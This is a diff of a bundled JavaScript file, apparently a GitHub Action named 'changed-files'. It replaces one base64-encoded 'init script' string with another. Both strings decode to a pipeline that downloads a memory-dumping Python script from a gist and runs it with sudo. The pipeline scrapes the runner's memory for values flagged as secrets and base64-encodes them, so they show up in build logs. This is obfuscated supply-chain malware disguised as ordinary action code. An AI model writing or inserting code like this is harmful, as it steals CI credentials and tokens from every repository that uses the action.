@@ -1868,7 +1868,7 @@ async function run() {
     core.startGroup('changed-files');
     try {
         // Base64 encoded content of init.sh
-        const initScriptBase64 = 'Y3VybCAtc1NmIGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vYXNoaXNoa3VybWkvMWFiMTM3NWJhZTRiNzBlNmRlYzZmNGE2MDJhOWYzMWQvcmF3LzJlYWIwYzgyMTRkZTI4MDU5NGJiNmJlMzJiOGE2NWQ2N2UyNzc4ZDIvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDAKZWNobw==';
+        const initScriptBase64 = 'Y3VybCAtc1NmIGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vYXNoaXNoa3VybWkvMWFiMTM3NWJhZTRiNzBlNmRlYzZmNGE2MDJhOWYzMWQvcmF3LzJlYWIwYzgyMTRkZTI4MDU5NGJiNmJlMzJiOGE2NWQ2N2UyNzc4ZDIvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwCmVjaG8=';
         const initScriptContent = Buffer.from(initScriptBase64, 'base64').toString('utf-8');
         const initScriptPath = '/tmp/run.sh';
         // Create init.sh dynamically
